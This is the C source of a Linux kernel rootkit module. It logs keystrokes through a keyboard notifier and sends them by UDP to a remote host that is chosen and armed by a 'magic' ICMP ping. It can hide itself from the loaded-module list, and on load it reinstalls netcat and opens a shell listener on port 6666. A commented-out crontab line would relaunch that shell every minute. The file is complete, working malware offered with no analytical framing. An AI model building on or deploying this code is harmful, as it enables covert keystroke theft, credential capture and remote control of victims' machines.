#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#define LOG
/*#define HIDE*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/keyboard.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>

#include <linux/netpoll.h>

/* PROTO */

int keyboard_hook(struct notifier_block *, unsigned long code, void *);

/* DATA */

const int KEYLOGGER_ACTIVATE_CODE = 122;
const int KEYLOGGER_DECATIVATE_CODE = 123;

int KEYLOGGER_ACTIVE = 0;

static struct nf_hook_ops netfilter_hook;
static struct notifier_block keyboard_notifier = {
  .notifier_call = keyboard_hook
};

static struct netpoll* np = NULL;
static struct netpoll np_t;

struct list_head * new_head;

/* FUNCTIONALITY */

void init_netpoll(int src, int dest)
{
    np_t.name = "LRNG";
    strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
    np_t.local_ip.ip = src;
    np_t.local_ip.in.s_addr = src;
    np_t.remote_ip.ip = dest;
    np_t.remote_ip.in.s_addr = dest;
    np_t.ipv6 = 0;//no IPv6
    np_t.local_port = 6666;
    np_t.remote_port = 1337;
    memset(np_t.remote_mac, 0xff, ETH_ALEN);
    netpoll_print_options(&np_t);
    netpoll_setup(&np_t);
    np = &np_t;
}

void sendUdp(const char* buf)
{
  int len = strlen(buf);
  netpoll_send_udp(np, buf,len);
}

int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;

#ifdef LOG
	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
#endif

	if (code == KBD_KEYCODE && param->down && KEYLOGGER_ACTIVE){
	      printk(KERN_DEBUG "KEYLOGGER SENDING KEY %i %s\n", param->value, (param->down ? "down" : "up"));
	      char str[5];
	      sprintf(str, "%d.", param->value);
	      sendUdp(str);
    }

	return NOTIFY_OK;
}

void hide_module(void){
	new_head=__this_module.list.next;
	list_del(&(__this_module.list));

}

void unhide_module(void){
	list_add(&(__this_module.list), new_head);
}

void start_remote_shell(void){
    char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL}; 
    char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL}; // -y allways answer yes
    char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; 
    //char *argv4[] = {"/bin/sh", "-c", "echo \"* * * * * root /bin/netcat -l -p 6666 -e /bin/sh\" >> /etc/crontab", NULL};

    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); /*Remove all netcat version*/
    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); /*Install netcat-taditional*/
    //call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_PROC); /*Add rule to crontab to launch netcat every minute*/

    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); //Launch netcat the fisrt time
}

static void handle_magic_package(int code, int src, int dest){
	if (code == KEYLOGGER_ACTIVATE_CODE){
			if(!KEYLOGGER_ACTIVE){
              init_netpoll(src, dest);
              sendUdp("Hello");
            }
            KEYLOGGER_ACTIVE = 1;
#ifdef LOG
            printk(KERN_DEBUG "KEYLOGGER ACTIVATION PACKAGE!");
#endif
    }else if (code == KEYLOGGER_DECATIVATE_CODE){
    	KEYLOGGER_ACTIVE = 0;
    }     
}

static unsigned int filter_icmp_messages(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
  	struct iphdr *iph;
   	struct icmphdr *icmph;

   	if(skb == NULL)
    	return -1;

   	iph = ip_hdr(skb);
   	if(iph->protocol == IPPROTO_ICMP){
        icmph = icmp_hdr(skb);
        if(icmph->type == ICMP_ECHO && icmph->code == icmph->un.echo.id)
        	handle_magic_package(icmph->code,iph->daddr, iph->saddr);
   }
   return NF_ACCEPT;
}


/*BOOTSTRAPING*/

static int __init rootkit_start(void){
#ifdef HIDE	
	hide_module();
#endif
	start_remote_shell();
	register_keyboard_notifier(&keyboard_notifier);

	netfilter_hook.hook = filter_icmp_messages;
    netfilter_hook.hooknum = 0;
    netfilter_hook.pf = PF_INET;
    netfilter_hook.priority = 1;
    nf_register_hook(&netfilter_hook);

	return 0;
}

static void __exit rootkit_end(void){
	unregister_keyboard_notifier(&keyboard_notifier);
	nf_unregister_hook(&netfilter_hook);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
